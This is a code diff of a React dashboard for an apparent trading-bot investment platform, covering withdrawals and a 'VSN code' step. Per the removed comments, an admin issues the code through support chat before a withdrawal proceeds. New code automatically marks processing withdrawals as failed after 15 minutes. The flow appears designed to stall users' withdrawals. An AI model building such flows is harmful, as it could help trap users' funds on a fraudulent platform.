@@ -155,9 +155,9 @@ export default function Dashboard() {
   const [withdrawWallet, setWithdrawWallet] = useState("");
   const [withdrawError, setWithdrawError] = useState("");
 
-  // ── VSN state (modal shown only when user clicks Withdraw again after vsn_required=true) ──
-  const [vsnRequired, setVsnRequired] = useState(false); // live from Firestore
-  const [showVsnModal, setShowVsnModal] = useState(false); // only open on user action
+  // ── VSN state ─────────────────────────────────────────────────────────────────
+  const [vsnRequired, setVsnRequired] = useState(false);
+  const [showVsnModal, setShowVsnModal] = useState(false);
   const [vsnInput, setVsnInput] = useState("");
   const [vsnError, setVsnError] = useState("");
   const [vsnSuccess, setVsnSuccess] = useState(false);
@@ -228,7 +228,6 @@ export default function Dashboard() {
       const data = snap.data();
       setBalance(data.balance || 0);
       setBotPhase(computePhase(data));
-      // Track vsn_required silently — do NOT auto-show modal
       setVsnRequired(data.vsn_required === true && !data.vsn_verified);
     });
     return () => unsub();
@@ -249,6 +248,28 @@ export default function Dashboard() {
     });
     return () => unsub();
   }, [session?.uid]);
+
+  // ─── Auto-fail processing withdrawals after 15 minutes ───
+  useEffect(() => {
+    if (!session?.uid || userTransactions.length === 0) return;
+    const FIFTEEN_MINS_MS = 15 * 60 * 1000;
+    const now = Date.now();
+    userTransactions.forEach(async (t) => {
+      if (t.type === "withdrawal" && t.status === "processing") {
+        const age = now - new Date(t.timestamp).getTime();
+        if (age >= FIFTEEN_MINS_MS) {
+          try {
+            await updateDoc(
+              doc(db, "users", session.uid, "transactions", t.id),
+              { status: "failed" },
+            );
+          } catch (e) {
+            console.error("Failed to mark withdrawal as failed:", e);
+          }
+        }
+      }
+    });
+  }, [userTransactions, session?.uid]);
 
   useEffect(() => {
     document.body.style.overflow = sidebarOpen ? "hidden" : "";
@@ -372,19 +393,14 @@ export default function Dashboard() {
   };
 
   // ── Withdraw handler ──────────────────────────────────────────────────────────
-  // Step 1: User fills form and clicks Withdraw → save pending request → show "contact support" message
-  // Step 2: Admin generates VSN and tells user via support chat
-  // Step 3: User comes back, clicks Withdraw again → VSN modal appears (because vsn_required=true)
   const handleWithdrawClick = () => {
     setWithdrawError("");
 
-    // If admin has already set vsn_required=true, show the VSN modal instead of the form
     if (vsnRequired) {
       setShowVsnModal(true);
       return;
     }
 
-    // Otherwise validate and submit the withdrawal request
     if (!withdrawAmount || parseFloat(withdrawAmount) <= 0) {
       setWithdrawError("Please enter a valid withdrawal amount.");
       return;
@@ -569,6 +585,27 @@ export default function Dashboard() {
     )
       return "+";
     return "-";
+  };
+
+  // ── Status badge helper ───────────────────────────────────────────────────────
+  const getStatusBadgeStyle = (status) => {
+    if (status === "completed") {
+      return {
+        background: "rgba(13,148,136,0.15)",
+        color: "#0d9488",
+      };
+    }
+    if (status === "failed") {
+      return {
+        background: "rgba(239,68,68,0.15)",
+        color: "#ef4444",
+      };
+    }
+    // processing / pending / anything else → amber
+    return {
+      background: "rgba(245,158,11,0.15)",
+      color: "#fbbf24",
+    };
   };
 
   return (
@@ -1611,14 +1648,7 @@ export default function Dashboard() {
                               <span style={{ textAlign: "center" }}>
                                 <span
                                   style={{
-                                    background:
-                                      t.status === "completed"
-                                        ? "rgba(13,148,136,0.15)"
-                                        : "rgba(245,158,11,0.15)",
-                                    color:
-                                      t.status === "completed"
-                                        ? "#0d9488"
-                                        : "#fbbf24",
+                                    ...getStatusBadgeStyle(t.status),
                                     padding: "3px 10px",
                                     borderRadius: "6px",
                                     fontSize: "11px",
@@ -1793,7 +1823,6 @@ export default function Dashboard() {
                               </svg>
                             </div>
                           </div>
-
                           <p
                             style={{
                               color: "#111",
@@ -1807,7 +1836,6 @@ export default function Dashboard() {
                             <br />
                             Balance
                           </p>
-
                           <p
                             style={{
                               color: "#0d9488",
@@ -1829,7 +1857,6 @@ export default function Dashboard() {
                           gap: "16px",
                         }}
                       >
-                        {/* If VSN has already been issued by admin, show a hint banner */}
                         {vsnRequired && (
                           <div
                             style={{
@@ -1861,7 +1888,6 @@ export default function Dashboard() {
                               />
                               <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                             </svg>
-
                             <div>
                               <p
                                 style={{
@@ -1873,7 +1899,6 @@ export default function Dashboard() {
                               >
                                 VSN Code Ready
                               </p>
-
                               <p
                                 style={{
                                   color: "#14b8a6",
@@ -1913,7 +1938,6 @@ export default function Dashboard() {
                               <line x1="12" y1="8" x2="12" y2="12" />
                               <line x1="12" y1="16" x2="12.01" y2="16" />
                             </svg>
-
                             <span
                               style={{
                                 color: "#0d9488",
@@ -1926,7 +1950,6 @@ export default function Dashboard() {
                           </div>
                         )}
 
-                        {/* Only show form fields if VSN not yet required */}
                         {!vsnRequired && (
                           <>
                             <div>
@@ -1945,7 +1968,6 @@ export default function Dashboard() {
                                 >
                                   Amount
                                 </label>
-
                                 <span
                                   style={{
                                     color: "#0d9488",
@@ -1962,7 +1984,6 @@ export default function Dashboard() {
                                   Max
                                 </span>
                               </div>
-
                               <input
                                 type="number"
                                 placeholder="Enter USD Amount"
@@ -1996,7 +2017,6 @@ export default function Dashboard() {
                               >
                                 Payment Details
                               </label>
-
                               <textarea
                                 rows={4}
                                 placeholder="Enter your preferred wallet / bank details"
@@ -2204,14 +2224,7 @@ export default function Dashboard() {
                             <span style={{ textAlign: "center" }}>
                               <span
                                 style={{
-                                  background:
-                                    t.status === "completed"
-                                      ? "rgba(13,148,136,0.15)"
-                                      : "rgba(245,158,11,0.15)",
-                                  color:
-                                    t.status === "completed"
-                                      ? "#0d9488"
-                                      : "#fbbf24",
+                                  ...getStatusBadgeStyle(t.status),
                                   padding: "3px 10px",
                                   borderRadius: "6px",
                                   fontSize: "11px",
@@ -2792,6 +2805,7 @@ export default function Dashboard() {
           );
         })}
       </div>
+
       {/* ══════════════ VSN CODE MODAL ══════════════ */}
       {showVsnModal && (
         <div
@@ -2821,7 +2835,6 @@ export default function Dashboard() {
               animation: "vsnSlideUp 0.35s cubic-bezier(0.34,1.56,0.64,1)",
             }}
           >
-            {/* ICON */}
             <div
               style={{
                 width: "68px",
@@ -2851,7 +2864,6 @@ export default function Dashboard() {
               </svg>
             </div>
 
-            {/* TITLE */}
             <h3
               style={{
                 color: "#fff",
@@ -2864,7 +2876,6 @@ export default function Dashboard() {
               Enter VSN Code
             </h3>
 
-            {/* DESCRIPTION */}
             <p
               style={{
                 color: "#94a3b8",
@@ -2906,7 +2917,6 @@ export default function Dashboard() {
                     <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" />
                     <polyline points="22 4 12 14.01 9 11.01" />
                   </svg>
-
                   <p
                     style={{
                       color: "#14b8a6",
@@ -2918,7 +2928,6 @@ export default function Dashboard() {
                     VSN Verified!
                   </p>
                 </div>
-
                 <p
                   style={{
                     color: "#94a3b8",
@@ -2931,7 +2940,6 @@ export default function Dashboard() {
               </div>
             ) : (
               <>
-                {/* INPUT */}
                 <input
                   type="text"
                   className="vsn-input"
@@ -2965,7 +2973,6 @@ export default function Dashboard() {
                   }}
                 />
 
-                {/* ERROR */}
                 {vsnError && (
                   <p
                     style={{
@@ -2979,7 +2986,6 @@ export default function Dashboard() {
                   </p>
                 )}
 
-                {/* BUTTON */}
                 <button
                   onClick={handleVsnSubmit}
                   disabled={vsnLoading}
@@ -3023,7 +3029,6 @@ export default function Dashboard() {
                   )}
                 </button>
 
-                {/* CANCEL */}
                 <button
                   onClick={() => {
                     setShowVsnModal(false);
